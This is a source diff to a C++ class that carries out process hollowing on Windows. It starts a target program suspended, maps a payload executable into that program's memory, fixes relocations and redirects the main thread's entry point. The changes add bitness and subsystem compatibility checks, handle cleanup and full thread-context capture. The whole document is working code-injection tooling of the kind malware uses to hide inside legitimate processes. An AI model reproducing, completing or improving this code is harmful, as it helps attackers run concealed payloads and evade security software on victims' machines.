@@ -5,18 +5,22 @@
 #include <iostream> // Delete!
 
 ProcessHollowing::ProcessHollowing(const std::string& targetPath, const std::string& payloadPath) :
-    _targetFilePath(targetPath), _payloadFilePath(payloadPath), _payloadBufferSize(0),
+    _targetFilePath(targetPath), _payloadFilePath(payloadPath), _targetProcessInformation(CreateSuspendedTargetProcess()),
     _payloadBuffer(ReadFileContents(payloadPath, _payloadBufferSize)),
-    _targetProcessInformation(CreateSuspendedTargetProcess())
+    _isTarget64Bit(IsProcess64Bit(_targetProcessInformation.hProcess)), _isPayload64Bit(IsPEFile64Bit(_payloadBuffer))
 {
-    // Add checkings
+    if (!AreProcessesCompatible())
+    {
+        std::cout << "The processes are not compatible!" << std::endl;
+        // Exception
+    }
 }
 
 void ProcessHollowing::hollow()
 {
     std::cout << "PID: " << _targetProcessInformation.dwProcessId << std::endl;
 
-    PEB targetPEB = ReadTargetProcessPEB();
+    PEB targetPEB = ReadProcessPEB(_targetProcessInformation.hProcess);
 
     IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
     IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));
@@ -35,7 +39,7 @@ void ProcessHollowing::hollow()
 
     WriteTargetProcessHeaders(targetNewBaseAddress, _payloadBuffer);
 
-    UpdateTargetProcessEntryPoint((ULONGLONG)((LPBYTE)targetNewBaseAddress + payloadNTHeaders.OptionalHeader.AddressOfEntryPoint), true /* <-- Change it! */);
+    UpdateTargetProcessEntryPoint((ULONGLONG)((LPBYTE)targetNewBaseAddress + payloadNTHeaders.OptionalHeader.AddressOfEntryPoint));
 
     ULONGLONG delta = (ULONGLONG)targetNewBaseAddress - payloadNTHeaders.OptionalHeader.ImageBase;
     if(0 != delta)
@@ -73,15 +77,15 @@ PROCESS_INFORMATION ProcessHollowing::CreateSuspendedTargetProcess()
     return processInformation;
 }
 
-PEB ProcessHollowing::ReadTargetProcessPEB()
+PEB ProcessHollowing::ReadProcessPEB(HANDLE process)
 {
     PROCESS_BASIC_INFORMATION targetBasicInformation;
     DWORD returnLength = 0;
-    NtdllFunctions::_NtQueryInformationProcess(_targetProcessInformation.hProcess, ProcessBasicInformation,
+    NtdllFunctions::_NtQueryInformationProcess(process, ProcessBasicInformation,
         &targetBasicInformation, sizeof(targetBasicInformation), &returnLength);
     
     PEB processPEB;
-    if (0 == ReadProcessMemory(_targetProcessInformation.hProcess, targetBasicInformation.PebBaseAddress, &processPEB, sizeof(processPEB),
+    if (0 == ReadProcessMemory(process, targetBasicInformation.PebBaseAddress, &processPEB, sizeof(processPEB),
         nullptr))
     {
         std::cout << "186" << std::endl;
@@ -93,16 +97,21 @@ PEB ProcessHollowing::ReadTargetProcessPEB()
 
 PBYTE ProcessHollowing::ReadFileContents(const std::string& filePath, DWORD& readBytesAmount)
 {
-    HANDLE sourceFileHandle = CreateFileA(filePath.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, nullptr);
-    if (INVALID_HANDLE_VALUE == sourceFileHandle)
+    HANDLE fileHandle = CreateFileA(filePath.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, nullptr);
+    if (INVALID_HANDLE_VALUE == fileHandle)
     {
         std::cout << "194" << std::endl;
         // Exception
     }
 
-    DWORD sourceFileSize = GetFileSize(sourceFileHandle, nullptr);
-    PBYTE fileContents = new BYTE[sourceFileSize];
-    ReadFile(sourceFileHandle, fileContents, sourceFileSize, &readBytesAmount, nullptr);
+    DWORD fileSize = GetFileSize(fileHandle, nullptr);
+    PBYTE fileContents = new BYTE[fileSize];
+    ReadFile(fileHandle, fileContents, fileSize, &readBytesAmount, nullptr);
+
+    if (0 == CloseHandle(fileHandle))
+    {
+        std::cout << "115" << std::endl;
+    }
     
     return fileContents;
 }
@@ -148,14 +157,14 @@ void ProcessHollowing::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE 
     }
 }
 
-void ProcessHollowing::UpdateTargetProcessEntryPoint(ULONGLONG newEntryPointAddress, bool is64Bit)
+void ProcessHollowing::UpdateTargetProcessEntryPoint(ULONGLONG newEntryPointAddress)
 {
 /*#if defined(_WIN64)
     if (!is64Bit)
     {
         WOW64_CONTEXT processContext = { 0 };
         ZeroMemory(&processContext, sizeof(processContext));
-        processContext.ContextFlags = WOW64_CONTEXT_INTEGER;
+        processContext.ContextFlags = WOW64_CONTEXT_ALL;
         if (0 == Wow64GetThreadContext(processMainThread, &processContext))
         {
             std::cout << "284" << std::endl;
@@ -174,7 +183,7 @@ void ProcessHollowing::UpdateTargetProcessEntryPoint(ULONGLONG newEntryPointAddr
 #endif*/
     CONTEXT processContext = { 0 };
     ZeroMemory(&processContext, sizeof(processContext));
-    processContext.ContextFlags = CONTEXT_INTEGER;
+    processContext.ContextFlags = CONTEXT_ALL;
     if (0 == GetThreadContext(_targetProcessInformation.hThread, &processContext))
     {
         std::cout << "301" << std::endl;
@@ -315,15 +324,61 @@ DWORD ProcessHollowing::SectionCharacteristicsToMemoryProtections(DWORD characte
     return 0;
 }
 
+ULONG ProcessHollowing::GetProcessSubsystem(HANDLE process)
+{
+    PEB processPEB = ReadProcessPEB(process);
+    
+    return processPEB.ImageSubSystem;
+}
+
+WORD ProcessHollowing::GetPEFileSubsystem(const PBYTE fileBuffer)
+{
+    IMAGE_DOS_HEADER dosHeader = *((PIMAGE_DOS_HEADER)fileBuffer);
+    IMAGE_NT_HEADERS ntHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)fileBuffer + dosHeader.e_lfanew));
+
+    return ntHeaders.OptionalHeader.Subsystem;
+}
+
 bool ProcessHollowing::IsProcess64Bit(const HANDLE processHandle)
 {
-#if defined(_WIN64)
-    BOOL is32Bit = FALSE;
-    IsWow64Process(processHandle, &is32Bit);
+    BOOL runningUnderWOW64 = FALSE;
 
-    return FALSE == is32Bit;
+    if (0 == IsWow64Process(processHandle, &runningUnderWOW64))
+    {
+        std::cout << "324 Error code: " << GetLastError() << std::endl;
+        // Exception
+    }
+
+    if (runningUnderWOW64)
+    {
+        return false;
+    }
+
+    return IsWindows64Bit();
+}
+
+bool ProcessHollowing::AreProcessesCompatible()
+{
+    WORD payloadSubsystem = GetPEFileSubsystem(_payloadBuffer);
+
+    return (_isTarget64Bit == _isPayload64Bit) && ((IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem) ||
+        (payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)));
+}
+
+bool ProcessHollowing::IsWindows64Bit()
+{
+#ifdef _WIN64
+    return true;
 #else
-    return false;
+    BOOL runningUnderWOW64 = FALSE;
+
+    if (0 ==IsWow64Process(GetCurrentProcess(), &runningUnderWOW64))
+    {
+        std::cout << "344" << std::endl;
+        // Exception
+    }
+
+    return TRUE == runningUnderWOW64;
 #endif
 }
 
